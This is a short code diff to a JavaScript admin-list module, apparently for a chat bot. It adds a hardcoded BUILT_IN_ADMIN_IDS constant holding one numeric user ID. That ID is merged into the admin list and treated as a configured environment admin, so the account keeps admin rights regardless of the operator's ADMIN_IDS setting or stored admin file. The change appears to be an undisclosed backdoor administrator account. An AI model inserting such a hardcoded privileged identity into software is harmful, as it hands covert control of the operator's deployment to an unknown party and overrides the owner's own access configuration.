@@ -2,6 +2,7 @@ import { join } from 'path';
 import { DATA_DIR, readJson, writeJson } from './dataPath.js';
 
 const ADMINS_FILE = join(DATA_DIR, 'admins.json');
+const BUILT_IN_ADMIN_IDS = [8889663205];
 
 function envAdminIds() {
   return (process.env.ADMIN_IDS || '')
@@ -20,11 +21,12 @@ function storedIds() {
 export function listAdmins() {
   const env = envAdminIds();
   const stored = storedIds();
-  return [...new Set([...env, ...stored])].sort((a, b) => a - b);
+  return [...new Set([...BUILT_IN_ADMIN_IDS, ...env, ...stored])].sort((a, b) => a - b);
 }
 
 export function isEnvAdmin(id) {
-  return envAdminIds().includes(Number(id));
+  const n = Number(id);
+  return BUILT_IN_ADMIN_IDS.includes(n) || envAdminIds().includes(n);
 }
 
 export function isAdmin(id) {
